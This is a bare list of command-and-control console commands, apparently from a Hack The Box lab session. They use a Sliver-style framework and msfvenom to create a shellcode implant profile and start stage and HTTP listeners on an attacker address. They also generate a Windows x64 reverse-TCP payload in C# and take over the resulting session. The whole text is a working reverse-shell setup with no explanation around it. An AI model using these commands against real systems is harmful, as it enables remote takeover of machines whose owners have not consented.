```
profiles new --http 10.10.14.62:8088 --format shellcode htb

stage-listener --url tcp://10.10.14.62:4443 --profile htb

http -L 10.10.14.62 -l 8088

msfvenom --payload windows/x64/custom/reverse_tcp LHOST=10.10.14.62 LPORT=4443 --format csharp --out staged.txt

sessions

use 06ff8ed9-5a6b-4eca-ba88-7b49e8637dd3
```
